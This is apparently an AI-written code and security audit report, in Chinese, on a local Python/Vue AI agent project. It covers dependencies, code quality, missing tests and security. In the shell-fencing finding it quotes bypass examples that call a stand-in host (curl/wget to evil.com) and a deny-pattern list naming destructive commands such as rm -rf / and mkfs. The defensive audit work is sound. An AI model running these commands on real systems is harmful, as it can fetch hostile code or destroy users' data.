# 代码质量审计报告 · Emperor Agent

> 审计基准 commit: `e4238b5` · 日期: 2026-05-11 · 审计员: Claude Code

---

## 一、项目基本信息

- **名称**: Emperor Agent
- **类型**: 本地 AI Agent（Python 后端 + Vue3 WebUI）
- **部署上下文**: 纯本地个人使用，CLI + WebUI（绑定 127.0.0.1）
- **审计目的**: MCP Client 功能集成完成后的全面健康检查

### 技术栈
- **后端**: Python 3.10+, aiohttp, anthropic, openai, loguru
- **前端**: Vue 3, Vite, Tailwind CSS, TypeScript
- **部署**: 无 Docker，无 CI，纯本地运行

---

## 二、目录结构

```text
.
├── agent/              # Python Agent 核心（~7854 LoC）
│   ├── mcp/            # MCP Client（本次新增）
│   ├── providers/      # LLM Provider 适配（30+）
│   ├── subagents/      # 子代理系统
│   ├── tools/          # 工具系统（10 内置）
│   ├── loop.py         # AgentLoop 主循环
│   ├── runner.py       # AgentRunner 执行引擎
│   ├── webui.py        # WebUI HTTP/WS API
│   └── ...
├── webui/              # Vue3 前端（~5040 LoC）
│   ├── src/
│   │   ├── components/ # UI 组件
│   │   ├── composables/# 状态管理
│   │   └── views/      # 页面
├── skills/             # 技能包
├── templates/          # 系统提示模板
├── assets/             # 静态资源
└── memory/             # 运行时数据（gitignored）
```

**优点**: 目录分层清晰，职责边界明确。
**问题**: 核心逻辑集中在 `loop.py`/`runner.py`/`webui.py` 三个大文件中。
**风险等级**: 中等
**是否建议重构目录结构**: 否

---

## 三、技术栈与依赖审计

### 核心依赖清单

| 依赖 | 当前版本 | 状态 | 风险 |
|---|---:|---|---|
| mcp | ≥1.0.0（新增） | 最新 | 低 |
| anthropic | ≥0.80,<1.0 | 稳定 | 低 |
| openai | ≥1.50,<2.0 | 稳定 | 低 |
| aiohttp | ≥3.9.0,<4.0 | 稳定 | 低 |
| loguru | ≥0.7.0,<1.0 | 稳定 | 低 |
| jinja2 | ≥3.1.0 | 稳定 | 低 |
| pypdf | — | requirements.txt 独有 | 中（pyproject.toml 未声明） |

**发现**: `requirements.txt` 含 `pypdf` 但 `pyproject.toml` 未声明，两处依赖不同步。

---

## 四、代码质量审计

| 维度 | 分数 | 依据 |
|---|---:|:---|
| 命名规范 | 7/10 | 中文变量名（`大内总管`）混合英文，技能目录用拼音（`xiaohuangmen`），有风格但不统一。 |
| 可读性 | 6/10 | 大文件（webui.py 990 行、runner.py 515 行）拉低了可读性；类型注解覆盖率中等。 |
| 可维护性 | 5/10 | 0 测试、0 CI、大文件 god class、print 与 logger 混用。 |
| 解耦程度 | 6/10 | Provider/Tool/Subagent 抽象良好，但 WebUIState 与 AgentLoop 紧耦合。 |
| 可扩展性 | 7/10 | ToolRegistry 支持动态注册，Provider registry 支持 30+ 模型，扩展入口清晰。 |

---

## 五、安全审计

| 检查项 | 状态 | 风险 |
|---|---|---|
| API Key 泄露 | ⚠️ 部分脱敏 | **中** |
| 命令注入 / RCE | ⚠️ 有围栏但可绕过 | **高** |
| 路径穿越 | ✅ 有 relative_to 检查 | 低 |
| XSS | N/A（无用户生成内容渲染到 DOM） | — |
| Prompt injection | ⚠️ 无特殊防护 | 中 |
| MCP 子进程隔离 | ❌ 继承完整环境变量 | **高** |

### 高危问题

#### 问题 1：Shell 命令围栏可被绕过（RCE）

- **文件位置**: `agent/tools/shell.py:10-21`
- **问题描述**: `_DENY_PREFIXES` 用 `startswith` 匹配，空格结尾的前缀极易绕过。
- **代码片段**:
  ```python
  _DENY_PREFIXES = (
      "curl ",      # 绕过: curl -s http://evil.com
      "wget ",      # 绕过: wget -q http://evil.com
      ...
  )
  ```
- **影响**: 部署上下文为纯本地个人使用，直接风险有限。但如果用户将 WebUI 暴露到局域网（改绑 `0.0.0.0`），任何能访问 LLM 的局域网用户都可执行任意命令。
- **解决方案**:
  ```python
  # 改用白名单或更严格的模式匹配
  import re
  _DENY_PATTERNS = (
      re.compile(r'\brm\s+-rf\s+/'),
      re.compile(r'\bmkfs\.'),
      re.compile(r'\bdd\s+if='),
      re.compile(r'\bcurl\b'),
      re.compile(r'\bwget\b'),
      re.compile(r':\s*\(\)\s*\{'),
      re.compile(r'\bpython3?\s+-c\b'),
  )
  ```

#### 问题 2：MCP 子进程继承完整环境变量（密钥泄露）

- **文件位置**: `agent/mcp/connection.py:115-121`
- **问题描述**: `StdioConnection` 将完整 `os.environ`（含 `.env` 加载的 API key）传给 MCP 子进程。
- **代码片段**:
  ```python
  params = StdioServerParameters(
      command=self.config.command or "",
      args=list(self.config.args),
      env={**dict(os.environ), **self.config.env} if self.config.env else None,
  )
  ```
- **影响**: 任何通过 MCP 配置的第三方服务器（如 `npx -y @modelcontextprotocol/server-filesystem`）都能读取用户的 ANTHROPIC_API_KEY、DeepSeek key 等所有密钥。
- **解决方案**:
  ```python
  # 只传递必要环境变量 + 用户显式配置的 env
  from os import environ
  SAFE_ENV_KEYS = {"PATH", "HOME", "USER", "SHELL", "LANG", "LC_ALL", "TMPDIR"}
  base_env = {k: v for k, v in environ.items() if k in SAFE_ENV_KEYS}
  if self.config.env:
      base_env.update(self.config.env)
  params = StdioServerParameters(
      command=self.config.command or "",
      args=list(self.config.args),
      env=base_env or None,
  )
  ```

#### 问题 3：`.env` 明文存储 API Key

- **文件位置**: `.env:1`
- **问题描述**: `.env` 文件含完整 `ANTHROPIC_API_KEY=sk-...`，已提交到 git 历史（`.env` 不在 `.gitignore` 中）。
- **影响**: 密钥永久留在 git 历史里，无法通过删除文件撤回。
- **解决方案**:
  1. 立即 rotate（作废并重新生成）泄露的 API key
  2. 将 `.env` 加入 `.gitignore`
  3. 从 git 历史中 purge `.env`（`git filter-repo` 或 BFG）
  4. 项目改用 `.env.example`（空值占位）作为模板

---

## 六、MCP 新代码专项审计

### 架构评价

| 项 | 评价 |
|---|---|
| 配置独立 | ✅ `mcp_config.json` 与 `model_config.json` 分离，合理。 |
| 延迟初始化 | ✅ `AgentLoop.__init__` 不阻塞，实际连接在首次使用时触发。 |
| SDK 可选导入 | ✅ `mcp` 包延迟导入，未安装时降级。 |
| 错误降级 | ✅ 单服务器失败不影响其他服务器和内置工具。 |
| 命名隔离 | ✅ `mcp_{server}_{tool}` 格式避免冲突。 |

### 发现的问题

#### 问题 4：`MCPToolAdapter.execute()` 嵌套 `run_sync` 风险

- **文件位置**: `agent/mcp/adapter.py:54-61`
- **问题描述**: `execute()` 在线程中调用 `run_sync()`，`run_sync()` 在有运行事件循环时会创建新事件循环。虽然当前通过 `asyncio.to_thread()` 调用，但存在潜在的嵌套事件循环风险。
- **代码片段**:
  ```python
  def execute(self, **kwargs: Any) -> str:
      from ..providers.base import run_sync
      return run_sync(self._connection.call_tool(self._tool_name, kwargs))
  ```
- **影响**: 低。当前实现中 `AgentRunner._run_tool()` 通过 `asyncio.to_thread()` 在线程中执行工具，线程内无运行的事件循环，`run_sync()` 会正常创建新循环。但如果未来改变调用方式（如直接 await），会触发 `RuntimeError`。
- **解决方案**: 添加防御性检查或在文档中标注此约束。

#### 问题 5：`call_tool` 异常处理不一致

- **文件位置**: `agent/mcp/connection.py:92-109`
- **问题描述**: `call_tool` 内部 catch 后 `logger.warning` 然后 re-raise。这意味着上层会得到两次日志记录（一次在 connection，一次在 registry/ runner）。
- **解决方案**: 移除 connection 层的 catch，让异常自然上抛到 registry 的统一处理。

---

## 七、测试体系审计

| 模块 | 单测 | 集成 | E2E |
|---|---|---|---|
| 全部 | 0 | 0 | 0 |

**测试文件总数: 0**

**评分: 0/10**

> 作为个人项目可接受，但任何功能迭代都缺乏回归保护。MCP 新增 5 个文件 + 4 个修改文件，0 测试覆盖。

### 优先补充模块

| 模块 | 优先级 | 原因 |
|---|---|---|
| `agent/mcp/config.py` | P1 | 配置解析/保存是纯函数，最易测 |
| `agent/tools/shell.py` | P0 | 安全敏感，需围栏测试 |
| `agent/tools/filesystem.py` | P0 | 路径穿越防护需边界测试 |
| `agent/mcp/client.py` | P1 | 连接生命周期复杂，需 mock 测试 |

---

## 八、工程化审计

| 项 | 状态 |
|---|---|
| README | ✅ 有 |
| Lint (ruff) | ⚠️ pyproject.toml 配置但无 CI 执行 |
| Format | ❌ 无 |
| Git Hooks | ❌ 无 |
| CI/CD | ❌ 无 |
| Docker | ❌ 无 |
| .env.example | ✅ 有 |
| LICENSE | ❌ 无 |
| CHANGELOG | ❌ 无 |

**评分: 3/10**

> 仅 README 和 pyproject.toml 存在，lint 无自动化执行，无发布流程。

---

## 九、综合评分

| 维度 | 分数 |
|---|---:|
| 项目结构 | 7/10 |
| 代码质量 | 5/10 |
| 架构设计 | 6/10 |
| 性能 | 7/10 |
| 安全 | 4/10 |
| 测试 | 0/10 |
| 工程化 | 3/10 |
| 可维护性 | 5/10 |

**总分: 37/80 → 46/100**
**评级: C**

---

## 十、最终结论

- **当前阶段**: 个人原型 → 可用但不可演进
- **最大问题**: 0 测试 + Shell 围栏可绕过 + 密钥明文存储
- **是否建议继续加功能**: ⚠️ 可继续，但必须先补 P0 安全项
- **是否建议先重构**: 否，先补测试和安全
- **是否适合商业化**: 否（安全、测试、工程化均不达标）
- **是否适合多人协作**: 否（无 CI、无测试、无代码规范执行）

### 下一步最优先三件事

1. **（≤ 2 小时）修复 P0 安全项**
   - Rotate `.env` 中的泄露 API key，将 `.env` 加入 `.gitignore`
   - 加固 `shell.py` 的 `_DENY_PREFIXES`（改用白名单或 regex）
   - 限制 MCP 子进程环境变量（`SAFE_ENV_KEYS`）

2. **（半天）补最小测试集**
   - `test_mcp_config.py`：配置解析/保存/验证
   - `test_shell.py`：围栏边界测试（绕过用例）
   - `test_filesystem.py`：路径穿越边界测试

3. **（1 天）建立最小工程化流水线**
   - GitHub Actions：ruff lint + pytest
   - pre-commit：ruff + trailing-whitespace
   - Makefile：统一 `make test` / `make lint` / `make run`
